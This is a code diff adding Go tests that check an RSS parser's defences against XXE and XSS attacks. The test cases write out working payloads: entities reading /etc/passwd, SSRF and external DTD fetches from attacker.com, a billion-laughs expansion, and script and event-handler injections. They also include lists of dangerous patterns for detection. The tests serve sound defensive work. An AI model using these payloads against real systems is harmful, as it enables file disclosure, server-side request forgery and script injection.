@@ -377,3 +377,204 @@ func TestFetchWithTimeout(t *testing.T) {
 	// We're mainly testing that it doesn't hang
 	_ = err
 }
+
+// TestRSSParser_XXEAttack tests that the RSS parser is protected against
+// XML External Entity (XXE) attacks. This is a critical security test.
+// See: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+func TestRSSParser_XXEAttack(t *testing.T) {
+	xxePayloads := []struct {
+		name        string
+		payload     string
+		description string
+	}{
+		{
+			name: "File disclosure via external entity",
+			description: "Tests that file:// protocol entities are not resolved",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "SSRF via XXE",
+			description: "Tests that http:// protocol entities are not resolved",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-server/admin">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "Parameter entity attack",
+			description: "Tests that parameter entities are not resolved",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<rss version="2.0">
+  <channel>
+    <title>Test</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "External DTD reference",
+			description: "Tests that external DTDs are not loaded",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE rss SYSTEM "http://attacker.com/malicious.dtd">
+<rss version="2.0">
+  <channel>
+    <title>Test</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "Billion laughs attack",
+			description: "Tests that entity expansion attacks are mitigated",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&lol4;</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+	}
+
+	for _, tc := range xxePayloads {
+		t.Run(tc.name, func(t *testing.T) {
+			parser := NewParser(&mockFetcher{feedContent: tc.payload})
+			feed, err := parser.Parse(context.Background(), "https://example.com/feed.xml")
+
+			// The parser should either:
+			// 1. Return an error (rejecting the malicious XML), OR
+			// 2. Parse successfully but NOT resolve the external entities
+			//
+			// gofeed uses encoding/xml which by default does NOT resolve
+			// external entities, so the feed may parse successfully but
+			// the title should NOT contain file contents or make network requests.
+
+			if err != nil {
+				// Parser rejected the malicious XML - this is good
+				t.Logf("Parser correctly rejected XXE payload: %v", err)
+				return
+			}
+
+			// If parsing succeeded, verify that XXE was NOT resolved
+			if feed != nil {
+				// The title should NOT contain file contents or URLs
+				// It should either be empty or contain the literal entity reference
+				dangerousStrings := []string{
+					"root:",           // /etc/passwd content
+					"admin",           // potential SSRF response
+					"attacker.com",    // external URL
+					"evil.dtd",        // external DTD reference
+					"lololololololol", // billion laughs expansion
+				}
+
+				for _, dangerous := range dangerousStrings {
+					if feed.Title != "" && containsSub(feed.Title, dangerous) {
+						t.Errorf("XXE vulnerability: title contains dangerous content %q", dangerous)
+					}
+				}
+
+				t.Logf("Parser handled XXE payload safely, title=%q", feed.Title)
+			}
+		})
+	}
+}
+
+// TestRSSParser_XSSInContent tests that the RSS parser sanitizes
+// potentially malicious content in feed items.
+func TestRSSParser_XSSInContent(t *testing.T) {
+	xssPayloads := []struct {
+		name    string
+		content string
+	}{
+		{
+			name: "Script tag in title",
+			content: `<?xml version="1.0"?>
+<rss version="2.0">
+  <channel>
+    <title><script>alert('xss')</script>Feed Title</title>
+    <link>https://example.com</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "JavaScript URL in link",
+			content: `<?xml version="1.0"?>
+<rss version="2.0">
+  <channel>
+    <title>Safe Title</title>
+    <link>javascript:alert('xss')</link>
+  </channel>
+</rss>`,
+		},
+		{
+			name: "Event handler in description",
+			content: `<?xml version="1.0"?>
+<rss version="2.0">
+  <channel>
+    <title>Safe Title</title>
+    <link>https://example.com</link>
+    <description><img src=x onerror=alert('xss')></description>
+  </channel>
+</rss>`,
+		},
+	}
+
+	for _, tc := range xssPayloads {
+		t.Run(tc.name, func(t *testing.T) {
+			parser := NewParser(&mockFetcher{feedContent: tc.content})
+			feed, err := parser.Parse(context.Background(), "https://example.com/feed.xml")
+
+			if err != nil {
+				// Parser rejected the content - acceptable
+				t.Logf("Parser rejected XSS payload: %v", err)
+				return
+			}
+
+			// If parsing succeeded, verify content is sanitized
+			if feed != nil {
+				// After sanitization, dangerous content should be removed
+				SanitizeFeed(feed)
+
+				dangerousPatterns := []string{
+					"<script",
+					"javascript:",
+					"onerror=",
+					"onload=",
+					"onclick=",
+				}
+
+				for _, pattern := range dangerousPatterns {
+					if containsSub(feed.Title, pattern) ||
+						containsSub(feed.Description, pattern) {
+						t.Errorf("XSS vulnerability: content contains dangerous pattern %q", pattern)
+					}
+				}
+			}
+		})
+	}
+}
